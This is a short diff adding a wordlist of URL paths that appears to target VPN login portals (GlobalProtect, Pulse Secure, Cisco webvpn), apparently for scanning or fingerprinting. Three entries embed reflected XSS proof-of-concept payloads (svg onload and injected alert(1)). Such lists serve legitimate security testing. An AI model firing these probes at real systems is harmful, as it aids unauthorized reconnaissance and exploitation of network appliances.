@@ -1,0 +1,10 @@
+/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+/default/showLogon.do
+/CACHE/sdesktop/data.xml
+/webvpn.html
+/?src=connect
+/dana-na/auth/url_default/welcome.cgi
+/dana-na/auth/url_2/welcome.cgi
+/dana-na/auth/url_3/welcome.cgi
+/global-protect/login.esp?user=j%22;-alert(1)-%22x
